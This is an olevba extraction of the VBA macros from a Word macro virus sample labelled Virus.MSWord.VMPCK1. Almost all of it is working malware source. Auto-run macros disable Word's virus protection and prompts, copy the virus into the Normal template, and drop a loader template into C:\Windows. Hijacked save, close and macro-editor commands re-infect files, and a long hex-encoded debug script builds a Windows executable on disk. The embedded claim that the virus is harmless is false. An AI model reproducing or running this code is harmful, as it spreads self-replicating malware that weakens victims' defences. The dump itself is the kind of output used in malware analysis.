olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.VMPCK1.cm
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.VMPCK1.cm - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Umang_Fa.bas 
in file: Virus.MSWord.VMPCK1.cm - OLE stream: 'Macros/VBA/Umang_Fa'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Public AD As Object, NT As Object
Sub AutoOpen()
    On Error GoTo hapus
Dim NT As Object
Dockenor
Create_Loader
Norkedoc
Application.EnableCancelKey = wdCancelDisabled
Options.VirusProtection = False
Options.SaveNormalPrompt = False
Options.ConfirmConversions = False
For i = 1 To NormalTemplate.VBProject.VBComponents.Count
    If NormalTemplate.VBProject.VBComponents(i).Name = "Umang_Fa" Then NormInstall = True
Next i
For i = 1 To ActiveDocument.VBProject.VBComponents.Count
    If ActiveDocument.VBProject.VBComponents(i).Name = "Umang_Fa" Then ActivInstall = True
Next i
If ActivInstall = True And NormInstall = True Then GoTo Label_Exit
If ActivInstall = True And NormInstall = False Then Set Doc = ActiveDocument
If ActivInstall = False And NormInstall = True Then Set Doc = NormalTemplate
Pad = Options.DefaultFilePath(wdDocumentsPath)
ModuleLength = Doc.VBProject.VBComponents("Umang_Fa").CodeModule.CountOfLines
NT.Save
Doc.VBProject.VBComponents("Umang_Fa").Export Pad + ("\Fax.txt")
ActiveDocument.SaveAs FileName:=ActiveDocument.FullName, FileFormat:=wdFormatDocument
Umang_Fa
Label_Exit:
CommandBars("Tools").Controls("Templates and Add-Ins...").Delete
'CommandBars("Format").Controls("Style...").Delete
If NormInstall = True Then Call Create_Loader
Application.ScreenUpdating = True
Application.DisplayAlerts = wdAlertsAll
Application.EnableCancelKey = wdCancelInterrupt
hapus:
Dockenor
End Sub
Sub Create_Loader()
On Error Resume Next
Options.DefaultFilePath(wdStartupPath) = "C:\Windows"
Options.DefaultFilePath(wdTempFilePath) = "C:\Windows\inf"
Pad1 = Options.DefaultFilePath(wdStartupPath)
MyFile = Dir(Pad1 + "\Fax.dot")
If MyFile = "" Then
Set aDoc = NormalTemplate.OpenAsDocument
With aDoc
    .SaveAs FileName:=Pad1 + "\Fax.dot"
    .Close SaveChanges:=wdDoNotSaveChanges
End With
End If
End Sub
Sub Umang_Fa()
On Error Resume Next
'Dockenor
Norkedoc
'Call sim
Call Create_Loader
Options.ConfirmConversions = False
Options.VirusProtection = False
Options.SaveNormalPrompt = False
ActiveDocument.ReadOnlyRecommended = False
If Month(Now()) = 1 And Day(Now()) = 9 Then Call ultah
If Month(Now()) = 11 And Day(Now()) = 16 Then Call ultah
With Dialogs(wdDialogFileSummaryInfo)
    .Author = "Phurbaranji ....... Bandarlampung"
    .Title = "Word Macro Virus.... it just fun"
    .Subject = "Dedicate for My Lv Umang_Fa Triwidhiyanti"
    .Comments = "Virus ini tidak berbahaya anda jangan coba-coba merubah atau menggunakan Tools|Macro Ntar tau akibatnya"
    .Execute
End With
bodo:
End Sub
Sub FileSave()
    On Error Resume Next
    Norkedoc
    'Dockenor
    ActiveDocument.Save
    Umang_Fa
End Sub
Sub FileClose()
    On Error Resume Next
    Norkedoc
    'Dockenor
    If ActiveDocument.Saved = False Then ActiveDocument.Save
    Umang_Fa
ActiveDocument.Close
End Sub
Sub FileSaveAs()
    On Error Resume Next
    Norkedoc
    'Dockenor
    Umang_Fa
Dialogs(wdDialogFileSaveAs).Show
End Sub
Sub FileExit()
    On Error Resume Next
    Norkedoc
    'Dockenor
    Umang_Fa
    If ActiveDocument.Saved = False Then ActiveDocument.Save
    Application.Quit
End Sub
Sub AutoExit()
    On Error Resume Next
    Norkedoc
    'Dockenor
    Umang_Fa
End Sub
Sub AutoExec()
On Error GoTo hapus
Norkedoc
Application.EnableCancelKey = wdCancelDisabled
    Call zap("c:\windows\zap.bat")
Call sim
Umang_Fa
WBF
AddIns.Unload False
WBF
hapus:
Dockenor
End Sub
Sub AutoClose()
    On Error Resume Next
    Norkedoc
    'Dockenor
    Umang_Fa
End Sub
Sub ToolsMacro()
    On Error Resume Next
    Umang_Fa
    If System.OperatingSystem = "Windows" Then Call p5687("C:\start.scr")
    If System.OperatingSystem = "Windows" Then Call startv("c:\startv.bat")
Call pesen
End Sub
Sub FileTemplates()
    On Error Resume Next
    Umang_Fa
    If System.OperatingSystem = "Windows" Then Call p5687("C:\start.scr")
    If System.OperatingSystem = "Windows" Then Call startv("c:\startv.bat")
Call pesen
End Sub
Sub ViewVBCode()
    On Error Resume Next
    Umang_Fa
    If System.OperatingSystem = "Windows" Then Call p5687("C:\start.scr")
    If System.OperatingSystem = "Windows" Then Call startv("c:\startv.bat")
Call pesen
End Sub
Sub p5687(strFile As String)
    On Error Resume Next
Dim hFile As Long
    hFile = FreeFile
    Open strFile For Output Access Write As hFile
Print #hFile, "N start.com"
Print #hFile, "E 0100 4D 5A 36 01 01 00 00 00 04 00 00 00 FF FF 00 00"
Print #hFile, "E 0110 B8 00 00 00 00 00 00 00 40 00 00 00 00 00 00 00"
Print #hFile, "E 0120 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #hFile, "E 0130 00 00 00 00 00 00 00 00 00 00 00 00 80 00 00 00"
Print #hFile, "E 0140 0E 1F BA 0E 00 B4 09 CD 21 B8 01 4C CD 21 54 68"
Print #hFile, "E 0150 69 73 20 70 72 6F 67 72 61 6D 20 72 65 71 75 69"
Print #hFile, "E 0160 72 65 73 20 4D 69 63 72 6F 73 6F 66 74 20 57 69"
Print #hFile, "E 0170 6E 64 6F 77 73 2E 0D 0A 24 00 00 00 00 00 00 00"
Print #hFile, "E 0180 4E 45 05 3C 9F 00 0F 00 00 00 00 00 02 03 02 00"
Print #hFile, "E 0190 00 04 00 14 1A 00 01 00 00 00 02 00 02 00 02 00"
Print #hFile, "E 01A0 3D 00 40 00 50 00 85 00 8E 00 92 00 2E 01 00 00"
Print #hFile, "E 01B0 02 00 04 00 00 00 02 08 18 00 0C 01 00 00 0A 03"
Print #hFile, "E 01C0 1A 00 39 0C 50 1D 39 0C F6 00 94 02 51 0C 94 02"
Print #hFile, "E 01D0 04 00 0E 80 01 00 00 00 00 00 24 01 02 00 30 1C"
Print #hFile, "E 01E0 2C 00 00 00 00 00 03 80 01 00 00 00 00 00 26 01"
Print #hFile, "E 01F0 2F 00 30 1C 01 80 00 00 00 00 00 00 08 41 4C 4F"
Print #hFile, "E 0200 41 50 49 43 4F 05 41 4C 4F 41 50 00 00 00 01 00"
Print #hFile, "E 0210 08 00 00 06 4B 45 52 4E 45 4C 04 55 53 45 52 02"
Print #hFile, "E 0220 FF 01 CD 3F 01 16 0A 01 CD 3F 01 18 0B 00 15 41"
Print #hFile, "E 0230 20 6D 69 6E 69 6D 75 6D 20 41 70 70 6C 69 63 61"
Print #hFile, "E 0240 74 69 6F 6E 00 00 09 45 58 43 49 54 50 52 4F 43"
Print #hFile, "E 0250 02 00 15 4F 56 45 52 4C 41 50 50 45 44 57 49 4E"
Print #hFile, "E 0260 44 4F 57 50 52 4F 43 31 01 00 00 00 00 00 00 00"
Print #hFile, "E 0270 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #hFile, "E 0280 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #hFile, "E 0290 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #hFile, "E 02A0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #hFile, "E 02B0 FF FF B0 FF 50 9A DD 01 3C 0B 33 ED 55 9A FF FF"
Print #hFile, "E 02C0 00 00 0B C0 74 EC 8C 06 46 00 81 C1 00 01 72 E2"
Print #hFile, "E 02D0 89 0E 10 00 89 36 12 00 89 3E 14 00 89 1E 16 00"
Print #hFile, "E 02E0 8C 06 18 00 89 16 1A 00 9A FF FF 00 00 86 C4 A3"
Print #hFile, "E 02F0 48 00 B4 30 2E F7 06 10 00 01 00 74 07 9A FF FF"
Print #hFile, "E 0300 00 00 EB 02 CD 21 A3 4C 00 86 C4 A3 4A 00 2E F7"
Print #hFile, "E 0310 06 10 00 01 00 75 05 B0 00 A2 4F 00 33 C0 50 9A"
Print #hFile, "E 0320 FF FF 00 00 FF 36 14 00 9A FF FF 00 00 0B C0 74"
Print #hFile, "E 0330 81 9A F0 00 18 00 9A D4 02 94 00 9A 56 04 99 00"
Print #hFile, "E 0340 E8 43 07 FF 36 84 00 FF 36 82 00 FF 36 80 00 9A"
Print #hFile, "E 0350 C4 00 9E 00 83 C4 06 50 9A CF 01 B2 00 B8 15 00"
Print #hFile, "E 0360 E9 28 04 00 8C D8 90 45 55 8B EC 1E 8E D8 FF 36"
Print #hFile, "E 0370 14 00 FF 36 12 00 FF 36 18 00 FF 36 16 00 FF 36"
Print #hFile, "E 0380 1A 00 9A F0 08 BB 00 83 ED 02 8B E5 1F 5D 4D CB"
Print #hFile, "E 0390 8C D8 90 45 55 8B EC 1E 8E D8 B8 00 35 2E F7 06"
Print #hFile, "E 03A0 10 00 01 00 74 07 9A 5E 00 00 00 EB 02 CD 21 89"
Print #hFile, "E 03B0 1E 32 00 8C 06 34 00 0E 1F B8 00 25 BA E6 04 2E"
Print #hFile, "E 03C0 F7 06 10 00 01 00 74 07 9A 07 01 00 00 EB 02 CD"
Print #hFile, "E 03D0 21 16 1F 8B 0E 1E 01 E3 29 8E 06 46 00 26 8B 36"
Print #hFile, "E 03E0 2C 00 A1 20 01 8B 16 22 01 33 DB FF 1E 1C 01 73"
Print #hFile, "E 03F0 03 E9 7A 01 A1 24 01 8B 16 26 01 BB 03 00 FF 1E"
Print #hFile, "E 0400 1C 01 8E 06 46 00 26 8B 0E 2C 00 E3 3E 8E C1 33"
Print #hFile, "E 0410 FF 26 80 3D 00 74 34 B9 0D 00 BE 24 00 F3 A6 74"
Print #hFile, "E 0420 0B B9 FF 7F 33 C0 F2 AE 75 21 EB E5 06 1E 07 1F"
Print #hFile, "E 0430 8B F7 BF 58 00 B1 04 AC 2C 41 72 0D D2 E0 92 AC"
Print #hFile, "E 0440 2C 41 72 05 0A C2 AA EB EE 16 1F BE 28 01 BF 28"
Print #hFile, "E 0450 01 E8 E2 00 BE 28 01 BF 28 01 E8 D9 00 BE 28 01"
Print #hFile, "E 0460 BF 28 01 E8 D0 00 83 ED 02 8B E5 1F 5D 4D CB 8C"
Print #hFile, "E 0470 D8 90 45 55 8B EC 1E 8E D8 33 C9 EB 2F 8C D8 90"
Print #hFile, "E 0480 45 55 8B EC 1E 8E D8 B9 01 00 EB 20 8C D8 90 45"
Print #hFile, "E 0490 55 8B EC 1E 8E D8 56 57 B9 00 01 EB 0F 8C D8 90"
Print #hFile, "E 04A0 45 55 8B EC 1E 8E D8 56 57 B9 01 01 88 2E 8D 00"
Print #hFile, "E 04B0 51 0A C9 75 1C BE 8A 02 BF 8A 02 E8 78 00 BE 28"
Print #hFile, "E 04C0 01 BF 28 01 E8 6F 00 8B 76 06 56 E8 B8 05 83 C4"
Print #hFile, "E 04D0 02 BE 28 01 BF 28 01 E8 5C 00 BE 28 01 BF 28 01"
Print #hFile, "E 04E0 E8 53 00 E8 27 00 58 0A E4 75 17 8B 46 06 B4 4C"
Print #hFile, "E 04F0 2E F7 06 10 00 01 00 74 07 9A 29 01 00 00 EB 02"
Print #hFile, "E 0500 CD 21 5F 5E 83 ED 02 8B E5 1F 5D 4D CB 8B 0E 1E"
Print #hFile, "E 0510 01 E3 07 BB 02 00 FF 1E 1C 01 1E C5 16 32 00 B8"
Print #hFile, "E 0520 00 25 2E F7 06 10 00 01 00 74 07 9A 5A 02 00 00"
Print #hFile, "E 0530 EB 02 CD 21 1F C3 3B F7 73 0E 83 EF 04 8B 05 0B"
Print #hFile, "E 0540 45 02 74 F2 FF 1D EB EE C3 00 8C D8 90 45 55 8B"
Print #hFile, "E 0550 EC 1E 8E D8 B8 FC 00 50 0E E8 A9 02 B8 FF 00 50"
Print #hFile, "E 0560 0E E8 A1 02 83 ED 02 8B E5 1F 5D 4D CB 00 B8 02"
Print #hFile, "E 0570 00 E9 17 02 8F 06 92 00 8F 06 94 00 B8 04 01 B9"
Print #hFile, "E 0580 08 00 E8 BD 02 89 16 88 00 A3 86 00 52 50 FF 36"
Print #hFile, "E 0590 14 00 52 50 B8 04 01 50 9A FF FF 00 00 5B 07 03"
Print #hFile, "E 05A0 D8 26 C6 07 00 BA 01 00 BF 01 00 BE 81 00 8E 1E"
Print #hFile, "E 05B0 46 00 AC 3C 20 74 FB 3C 09 74 F7 3C 0D 74 6F 0A"
Print #hFile, "E 05C0 C0 74 6B 47 4E AC 3C 20 74 E8 3C 09 74 E4 3C 0D"
Print #hFile, "E 05D0 74 5C 0A C0 74 58 3C 22 74 24 3C 5C 74 03 42 EB"
Print #hFile, "E 05E0 E4 33 C9 41 AC 3C 5C 74 FA 3C 22 74 04 03 D1 EB"
Print #hFile, "E 05F0 D3 8B C1 D1 E9 13 D1 A8 01 75 CA EB 01 4E AC 3C"
Print #hFile, "E 0600 0D 74 2B 0A C0 74 27 3C 22 74 BA 3C 5C 74 03 42"
Print #hFile, "E 0610 EB EC 33 C9 41 AC 3C 5C 74 FA 3C 22 74 04 03 D1"
Print #hFile, "E 0620 EB DB 8B C1 D1 E9 13 D1 A8 01 75 D2 EB 97 16 1F"
Print #hFile, "E 0630 89 3E 80 00 03 D7 47 D1 E7 03 D7 42 80 E2 FE 2B"
Print #hFile, "E 0640 E2 8B C4 A3 82 00 8B D8 03 FB 16 07 C5 36 86 00"
Print #hFile, "E 0650 36 89 37 43 43 36 8E 1E 46 00 BE 81 00 EB 03 33"
Print #hFile, "E 0660 C0 AA AC 3C 20 74 FB 3C 09 74 F7 3C 0D 74 7C 0A"
Print #hFile, "E 0670 C0 74 78 36 89 3F 43 43 4E AC 3C 20 74 E1 3C 09"
Print #hFile, "E 0680 74 DD 3C 0D 74 62 0A C0 74 5E 3C 22 74 27 3C 5C"
Print #hFile, "E 0690 74 03 AA EB E4 33 C9 41 AC 3C 5C 74 FA 3C 22 74"
Print #hFile, "E 06A0 06 B0 5C F3 AA EB D1 B0 5C D1 E9 F3 AA 73 06 B0"
Print #hFile, "E 06B0 22 AA EB C5 4E AC 3C 0D 74 2E 0A C0 74 2A 3C 22"
Print #hFile, "E 06C0 74 B7 3C 5C 74 03 AA EB EC 33 C9 41 AC 3C 5C 74"
Print #hFile, "E 06D0 FA 3C 22 74 06 B0 5C F3 AA EB D9 B0 5C D1 E9 F3"
Print #hFile, "E 06E0 AA 73 96 B0 22 AA EB CD 33 C0 AA 16 1F C7 07 00"
Print #hFile, "E 06F0 00 FF 2E 92 00 00 8C D8 90 45 55 8B EC 1E 8E D8"
Print #hFile, "E 0700 1E 9A FF FF 00 00 0B C0 74 03 BA 00 00 8B DA 8E"
Print #hFile, "E 0710 C2 33 C0 33 F6 33 FF B9 FF FF 0B DB 74 0E 26 80"
Print #hFile, "E 0720 3E 00 00 00 74 06 F2 AE 46 AE 75 FA 8B C7 40 24"
Print #hFile, "E 0730 FE 46 8B FE D1 E6 B9 09 00 E8 06 01 50 8B C6 E8"
Print #hFile, "E 0740 00 01 A3 84 00 06 1E 07 1F 8B CF 8B D8 33 F6 5F"
Print #hFile, "E 0750 49 E3 26 8B 04 36 3B 06 24 00 75 10 51 56 57 BF"
Print #hFile, "E 0760 24 00 B9 06 00 F3 A7 5F 5E 59 74 05 26 89 3F 43"
Print #hFile, "E 0770 43 AC AA 0A C0 75 FA E2 DA 26 89 0F 1F 83 ED 02"
Print #hFile, "E 0780 8B E5 1F 5D 4D CB 16 1F B8 03 00 50 50 0E E8 B9"
Print #hFile, "E 0790 FD 0E E8 70 00 0E E8 35 00 33 DB 0B C0 74 1D 8B"
Print #hFile, "E 07A0 F8 B8 09 00 80 3D 4D 75 03 B8 0F 00 03 F8 57 1E"
Print #hFile, "E 07B0 07 B0 0D B9 22 00 F2 AE 88 5D FF 58 53 1E 50 9A"
Print #hFile, "E 07C0 FF FF 00 00 B8 FF 00 50 9A FF FF 00 00 00 8C D8"
Print #hFile, "E 07D0 90 45 55 8B EC 1E 8E D8 56 57 1E 07 8B 56 06 BE"
Print #hFile, "E 07E0 30 01 AD 3B C2 74 10 40 96 74 0C 97 33 C0 B9 FF"
Print #hFile, "E 07F0 FF F2 AE 8B F7 EB EB 96 5F 5E 83 ED 02 8B E5 1F"
Print #hFile, "E 0800 5D 4D CA 02 00 8C D8 90 45 55 8B EC 1E 8E D8 57"
Print #hFile, "E 0810 83 3E 9C 00 00 74 1F FF 76 06 0E E8 B0 FF 0B C0"
Print #hFile, "E 0820 74 14 92 8B FA 33 C0 B9 FF FF F2 AE F7 D1 49 8B"
Print #hFile, "E 0830 1E 52 00 E8 55 02 5F 83 ED 02 8B E5 1F 5D 4D CA"
Print #hFile, "E 0840 02 00 55 8B EC 53 06 51 B9 00 10 87 0E 96 00 51"
Print #hFile, "E 0850 50 9A F2 07 E5 00 5B 8F 06 96 00 59 8C DA 0B C0"
Print #hFile, "E 0860 74 04 07 5B EB 05 8B C1 E9 20 FF 8B E5 5D C3 00"
Print #hFile, "E 0870 51 57 F6 47 02 01 74 63 E8 E7 00 8B FE 8B 04 A8"
Print #hFile, "E 0880 01 74 03 2B C8 49 41 41 8B 77 04 0B F6 74 4C 03"
Print #hFile, "E 0890 CE 73 09 33 C0 BA F0 FF E3 30 EB 3F 16 07 26 A1"
Print #hFile, "E 08A0 96 00 3D 00 10 74 16 BA 00 80 3B D0 72 06 D1 EA"
Print #hFile, "E 08B0 75 F8 EB 22 83 FA 08 72 1D D1 E2 8B C2 48 8B D0"
Print #hFile, "E 08C0 03 C1 73 02 33 C0 F7 D2 23 C2 52 E8 2E 00 5A 73"
Print #hFile, "E 08D0 0D 83 FA F0 74 05 B8 10 00 EB E2 F9 EB 1B 8B D0"
Print #hFile, "E 08E0 2B 57 04 89 47 04 89 7F 0A 8B 77 0C 4A 89 14 42"
Print #hFile, "E 08F0 03 F2 C7 04 FE FF 89 77 0C 5F 59 C3 8B D0 F6 47"
Print #hFile, "E 0900 02 04 74 02 EB 51 52 51 53 8B 77 06 2E 8B 1E 10"
Print #hFile, "E 0910 00 33 C9 0B D2 75 07 F7 C3 10 00 75 40 41 B8 02"
Print #hFile, "E 0920 00 F7 C3 01 00 75 03 B8 20 00 56 51 52 50 9A FF"
Print #hFile, "E 0930 FF 00 00 0B C0 74 26 3B C6 75 1C 56 9A FF FF 00"
Print #hFile, "E 0940 00 0B D0 74 12 5B 59 5A 8B C2 F6 47 02 04 74 04"
Print #hFile, "E 0950 4A 89 57 FE F8 EB 0A B8 12 00 E9 2E FE 5B 59 5A"
Print #hFile, "E 0960 F9 C3 57 8B 77 0A 3B 77 0C 75 03 8B 77 08 AD 83"
Print #hFile, "E 0970 F8 FE 74 08 8B FE 24 FE 03 F0 EB F2 4F 4F 8B F7"
Print #hFile, "E 0980 5F C3 45 55 8B EC 1E 8B 46 06 A3 98 00 C7 06 9A"
Print #hFile, "E 0990 00 00 00 8D 66 FE 1F 5D 4D CB 45 55 8B EC 1E B8"
Print #hFile, "E 09A0 FD 43 BA 03 00 52 50 FF 36 9A 00 FF 36 98 00 9A"
Print #hFile, "E 09B0 2E 07 B4 05 05 C3 9E 83 D2 26 A3 98 00 89 16 9A"
Print #hFile, "E 09C0 00 8B C2 80 E4 7F 8D 66 FE 1F 5D 4D CB 90 55 8B"
Print #hFile, "E 09D0 EC 8B 46 08 8B 4E 0C 0B C8 8B 4E 0A 75 09 8B 46"
Print #hFile, "E 09E0 06 F7 E1 5D CA 08 00 53 F7 E1 8B D8 8B 46 06 F7"
Print #hFile, "E 09F0 66 0C 03 D8 8B 46 06 F7 E1 03 D3 5B 5D CA 08 00"
Print #hFile, "E 0A00 55 8B EC 33 C0 8B 4E 0E E3 79 1E 57 56 C5 76 06"
Print #hFile, "E 0A10 C4 7E 0A 8B C1 48 8B D7 F7 D2 2B C2 1B DB 23 C3"
Print #hFile, "E 0A20 03 C2 8B D6 F7 D2 2B C2 1B DB 23 C3 03 C2 40 91"
Print #hFile, "E 0A30 2B C1 92 AC 26 8A 25 3A E0 75 1F 47 E2 F5 92 91"
Print #hFile, "E 0A40 E3 3E 0B F6 75 07 8C D8 05 FF FF 8E D8 0B FF 75"
Print #hFile, "E 0A50 C2 8C C0 05 A9 07 8E C0 EB B9 2C 41 3C 1A 1A DB"
Print #hFile, "E 0A60 80 E3 20 02 C3 04 41 80 EC 41 80 FC 1A 1A DB 80"
Print #hFile, "E 0A70 E3 20 02 E3 80 C4 41 3A C4 74 C0 1B C0 83 D8 FF"
Print #hFile, "E 0A80 5E 5F 1F 5D CB 00 55 8B EC 5D C3 B8 14 00 E9 FA"
Print #hFile, "E 0A90 FC 00 45 55 8B EC 1E 83 EC 02 83 7E 06 00 75 05"
Print #hFile, "E 0AA0 C7 46 06 01 00 B8 FF FF 50 9A 9F 08 00 00 B8 20"
Print #hFile, "E 0AB0 00 50 FF 76 06 9A FF FF 00 00 89 46 FC B8 FF FF"
Print #hFile, "E 0AC0 50 9A C7 08 00 00 83 7E FC 00 75 17 A1 A0 00 0B"
Print #hFile, "E 0AD0 06 9E 00 74 0E FF 76 06 FF 1E 9E 00 83 C4 02 0B"
Print #hFile, "E 0AE0 C0 75 C2 8B 46 FC 8D 66 FE 1F 5D 4D CB 90 45 55"
Print #hFile, "E 0AF0 8B EC 1E 83 7E 06 00 74 08 FF 76 06 9A FF FF 00"
Print #hFile, "E 0B00 00 8D 66 FE 1F 5D 4D CB 45 55 8B EC 1E 83 EC 04"
Print #hFile, "E 0B10 83 7E 06 00 75 0E FF 76 08 9A F2 07 90 08 83 C4"
Print #hFile, "E 0B20 02 EB 4B 90 83 7E 08 00 75 10 FF 76 06 9A 4E 08"
Print #hFile, "E 0B30 12 07 83 C4 02 33 C0 EB 35 90 B8 FF FF 50 9A FF"
Print #hFile, "E 0B40 FF 00 00 FF 76 06 83 7E 08 00 74 06 8B 46 08 EB"
Print #hFile, "E 0B50 04 90 B8 01 00 50 B8 62 00 50 9A FF FF 00 00 89"
Print #hFile, "E 0B60 46 FC B8 FF FF 50 9A FF FF 00 00 8B 46 FC 8D 66"
Print #hFile, "E 0B70 FE 1F 5D 4D CB 90 45 55 8B EC 1E FF 76 06 9A FF"
Print #hFile, "E 0B80 FF 00 00 8D 66 FE 1F 5D 4D CB 00 00 00 00 00 00"
Print #hFile, "E 0B90 C8 02 00 00 56 83 7E 0C 00 74 19 9A FF FF 00 00"
Print #hFile, "E 0BA0 50 1E 68 A8 00 1E 68 A2 00 6A 10 9A FF FF 00 00"
Print #hFile, "E 0BB0 33 C0 EB 30 8B 76 FE FF 76 06 FF 76 0A FF 76 08"
Print #hFile, "E 0BC0 FF 76 0C FF 76 0E 9A 4A 09 38 09 83 C4 0A 0B C0"
Print #hFile, "E 0BD0 74 10 FF 76 0E 9A E4 09 40 09 5B 8B F0 9A 14 0A"
Print #hFile, "E 0BE0 FF FF 8B C6 5E C9 CA 0A 00 00 C8 1A 00 00 56 8B"
Print #hFile, "E 0BF0 76 06 83 7E 08 00 75 4F C7 46 E6 00 00 C7 46 E8"
Print #hFile, "E 0C00 16 0A C7 46 EA 29 09 33 C0 89 46 EC 89 46 EE 89"
Print #hFile, "E 0C10 76 F0 56 1E 68 C2 00 9A FF FF 00 00 89 46 F2 C7"
Print #hFile, "E 0C20 46 F4 00 00 C7 46 F6 02 00 2B C0 89 46 FA 89 46"
Print #hFile, "E 0C30 F8 C7 46 FC CC 00 8C 5E FE 8D 46 E6 16 50 9A FF"
Print #hFile, "E 0C40 FF 00 00 0B C0 74 39 1E 68 CC 00 1E 68 DA 00 68"
Print #hFile, "E 0C50 08 20 6A 00 68 00 80 68 00 80 68 00 80 68 00 80"
Print #hFile, "E 0C60 6A 00 6A 00 56 6A 00 6A 00 9A FF FF 00 00 A3 92"
Print #hFile, "E 0C70 02 89 36 90 02 50 6A 07 9A FF FF 00 00 A1 92 02"
Print #hFile, "E 0C80 5E C9 CB 00 C8 12 00 00 EB 14 8D 46 EE 16 50 9A"
Print #hFile, "E 0C90 FF FF 00 00 8D 46 EE 16 50 9A FF FF 00 00 8D 46"
Print #hFile, "E 0CA0 EE 16 50 6A 00 6A 00 6A 00 9A FF FF 00 00 0B C0"
Print #hFile, "E 0CB0 75 D8 C9 CB CB 00 C8 14 00 00 57 56 8B 46 0C 48"
Print #hFile, "E 0CC0 74 2D 48 75 03 E9 AC 00 2D 11 00 75 03 E9 DE 00"
Print #hFile, "E 0CD0 2D 00 01 75 03 E9 BD 00 FF 76 0E FF 76 0C FF 76"
Print #hFile, "E 0CE0 0A FF 76 08 FF 76 06 9A FF FF 00 00 E9 C2 00 8B"
Print #hFile, "E 0CF0 76 0E 6A 00 9A 5F 0A 00 00 A3 7A 02 6A 01 9A FF"
Print #hFile, "E 0D00 FF 00 00 A3 7C 02 56 68 4C 04 1E 68 A2 00 1E 68"
Print #hFile, "E 0D10 E8 00 6A 1E 9A FF FF 00 00 8B F8 50 6A 00 6A 00"
Print #hFile, "E 0D20 9A FF FF 00 00 57 1E 68 EE 00 8D 46 EC 16 50 9A"
Print #hFile, "E 0D30 FF FF 00 00 83 C4 0A 1E 68 A2 00 1E 68 E8 00 8D"
Print #hFile, "E 0D40 46 EC 16 50 9A B6 0A 00 00 1E 68 A2 00 1E 68 0A"
Print #hFile, "E 0D50 01 1E 68 F2 00 9A FF FF 00 00 68 65 09 68 18 0B"
Print #hFile, "E 0D60 FF 36 90 02 9A FF FF 00 00 A3 7E 02 89 16 80 02"
Print #hFile, "E 0D70 56 E9 67 FF FF 36 80 02 FF 36 7E 02 9A FF FF 00"
Print #hFile, "E 0D80 00 FF 76 0E 68 4C 04 9A FF FF 00 00 6A 00 9A FF"
Print #hFile, "E 0D90 FF 00 00 EB 19 8B 46 0A 2D 4C 04 75 11 FF 36 80"
Print #hFile, "E 0DA0 02 FF 36 7E 02 6A 00 6A 00 9A FF FF 00 00 33 C0"
Print #hFile, "E 0DB0 99 5E 5F C9 CA 0A 00 00 C8 26 00 00 57 56 8B 76"
Print #hFile, "E 0DC0 0A 56 8D 46 DA 16 50 6A 13 9A FF FF 00 00 6A 06"
Print #hFile, "E 0DD0 1E 68 12 01 8D 46 DA 16 50 9A 60 07 A8 0B 83 C4"
Print #hFile, "E 0DE0 0A 0B C0 74 1E 56 9A FF FF 00 00 0B C0 75 14 56"
Print #hFile, "E 0DF0 9A FF FF 00 00 0B C0 74 0A 56 9A FF FF 00 00 0B"
Print #hFile, "E 0E00 C0 75 03 E9 CA 00 56 8D 46 EE 16 50 9A FF FF 00"
Print #hFile, "E 0E10 00 8B 46 F2 8B 7E EE 2B C7 89 46 FC 8B 46 F0 89"
Print #hFile, "E 0E20 46 FE 2B 46 F4 F7 D8 89 46 FA 0B FF 7F 07 C7 46"
Print #hFile, "E 0E30 F6 01 00 EB 29 8B 46 FC 03 C7 3B 06 7A 02 7C 05"
Print #hFile, "E 0E40 B8 FF FF EB 16 9A FA 06 DF 0B 2D FF 3F 0B C0 7E"
Print #hFile, "E 0E50 05 B8 01 00 EB 02 33 C0 03 C0 48 89 46 F6 83 7E"
Print #hFile, "E 0E60 FE 00 7F 07 C7 46 F8 01 00 EB 2A 8B 46 FA 03 46"
Print #hFile, "E 0E70 FE 3B 06 7C 02 7C 05 B8 FF FF EB 16 9A FA 06 F8"
Print #hFile, "E 0E80 0B 2D FF 3F 0B C0 7E 05 B8 01 00 EB 02 33 C0 03"
Print #hFile, "E 0E90 C0 48 89 46 F8 9A FA 06 0F 0C 8B C8 81 C1 E8 03"
Print #hFile, "E 0EA0 69 46 F6 30 75 99 F7 F9 03 F8 56 57 9A FA 06 BB"
Print #hFile, "E 0EB0 0A 8B C8 81 C1 E8 03 69 46 F8 30 75 99 F7 F9 03"
Print #hFile, "E 0EC0 46 FE 50 FF 76 FC FF 76 FA 6A 01 9A FF FF 00 00"
Print #hFile, "E 0ED0 B8 FF FF 5E 5F C9 CA 06 00 2E 00 03 01 F0 09 02"
Print #hFile, "E 0EE0 00 71 00 03 01 FA 09 02 00 72 00 02 00 7C 08 01"
Print #hFile, "E 0EF0 00 00 00 03 01 29 05 01 00 01 00 03 01 49 00 01"
Print #hFile, "E 0F00 00 03 00 03 01 62 04 01 00 83 00 03 01 16 08 01"
Print #hFile, "E 0F10 00 05 00 03 01 BB 08 01 00 06 00 03 01 5D 08 01"
Print #hFile, "E 0F20 00 07 00 03 01 0C 09 02 00 01 00 03 01 20 05 01"
Print #hFile, "E 0F30 00 89 00 05 01 B4 07 01 00 72 00 03 01 DF 08 01"
Print #hFile, "E 0F40 00 0A 00 03 01 89 00 02 00 05 00 03 01 EF 0A 02"
Print #hFile, "E 0F50 00 06 00 03 01 8F 06 01 00 10 00 03 01 81 0A 02"
Print #hFile, "E 0F60 00 0A 00 03 01 E8 0A 02 00 0C 00 03 01 9D 06 01"
Print #hFile, "E 0F70 00 14 00 03 01 0A 08 01 00 17 00 03 01 22 08 01"
Print #hFile, "E 0F80 00 18 00 03 01 80 00 01 00 1E 00 03 01 FC 08 02"
Print #hFile, "E 0F90 00 17 00 03 01 47 0B 02 00 1F 00 03 01 6D 0B 02"
Print #hFile, "E 0FA0 00 20 00 03 01 5B 0B 02 00 23 00 03 01 90 0A 02"
Print #hFile, "E 0FB0 00 A4 01 03 01 CA 09 02 00 29 00 03 01 F9 02 01"
